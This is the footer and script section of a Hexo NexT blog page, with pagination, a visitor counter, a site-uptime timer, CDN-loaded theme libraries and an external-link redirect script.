    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/24/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><span class="page-number current">25</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/26/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lzy</span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

<!--
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>-->
<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("03/01/2023 10:00:00"); //此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒.";
    }
setInterval("createtime()",250);
</script>

    </div>
  </footer>

  

  <a href="https://github.com/PowerLZY" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.4.3/mermaid.min.js","integrity":"sha256-e0o3JYsdjqKajf9eOe22FhioYSz9WofRY4dLKo3F6do="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>


  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>




        <script src="//cdn.jsdelivr.net/npm/js-base64/base64.min.js"></script>
        <script>
        const hasAttr = (e,a) => a.some(_=> e.attr(_)!==undefined);
        $('a').each(function() {
          const $this = $(this);
          if(hasAttr($this,["data-fancybox","ignore-external-link"])) return;
          const href = $this.attr('href');
          if (href && href.match('^((http|https|thunder|qqdl|ed2k|Flashget|qbrowser|ftp|rtsp|mms)://)')) {
            const strs = href.split('/');
            if (strs.length >= 3) {
                const host = strs[2];
                if (host !== 'powerlzy.github.io' || window.location.host) {
                    $this.attr('href', '/go.html?u='+Base64.encode(href)+'').attr('rel', 'external nofollow noopener noreferrer');
                    if (true) {
                        $this.attr('target', '_blank');
                    }
                }
            }
          }
        });
        </script></body>
</html>
